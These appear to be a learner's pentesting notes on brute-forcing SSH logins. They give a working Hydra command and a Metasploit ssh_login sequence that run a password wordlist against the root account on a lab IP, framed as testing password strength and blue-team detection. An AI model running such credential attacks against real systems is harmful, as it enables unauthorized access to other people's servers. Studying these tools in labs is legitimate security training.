<title>Brute Force Attacks</title>
</head><body>SSH is not always a low hanging fruit <br/>
- From a realistic prospective If we see SSH on an assessment <br/>
 will try to brute force against it.Or use weak or default credientials<br/>
- We are going to do that to test Password Strength<br/>
- We are going to test if we can go with a weak/default password<br/>
- How the blue team performs do they catch us or not <br/>
<br/>
- We are going to use a tool called <b>Hydra</b>(i.e. a bruteforce tool)<br/>
command : hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.142.129:22 -t 4 -V<br/>
where <br/>
-l stands for user that we are going to utilize here.<br/>
-P stands for password list.<br/>
-t for threads that will limit to 4<br/>
-V for verbosity to see the user attempts <br/>
<br/>
- Will open new terimal for MS because we should know multipule frameworks for same task.<br/>
command : search ssh<br/>
will be looking for something related to ssh login<br/>
command : use auxiliary/scanner/ssh/ssh_login / 46<br/>
command : options<br/>
command : set username root<br/>
command : set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt <br/>
command : set rhosts 192.168.142.129<br/>
command : set threads 10<br/>
command : set verbose true<br/>
command : true<br/>
command : run<br/>
<br/>
As I was stuck here so i have to install pimpmykali.<br/>
